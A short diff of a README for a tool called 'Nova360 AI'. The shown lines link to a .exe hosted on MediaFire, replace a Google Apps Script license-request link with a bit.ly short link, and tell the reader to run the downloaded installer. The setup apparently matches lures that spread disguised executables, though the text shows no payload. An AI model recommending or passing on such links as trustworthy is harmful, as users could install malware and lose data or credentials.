@@ -46,7 +46,7 @@ Nova360 AI is an all-in-one marketing automation tool designed to make social me
 ### **Step-by-Step Installation**  
 1. **Download Nova360 AI**:  
    - [Download Nova360 AI v2.1.1](https://www.mediafire.com/file/yh2wglgfa1t1dus/Nova360.exe)  
-   - [Request Full Version & License](https://script.google.com/macros/s/AKfycbxcFnuOwtTNKf1XtpxKzMbrcUKy2doMJ7S2GObFLbm0zhKTV61v_ZnMPxfih-eXfO4ttg/exec)  
+   - [Request Full Version & License](https://bit.ly/nova360ai)  
 
 2. **Run the Installer**:  
    - Double-click the downloaded `.exe` file.
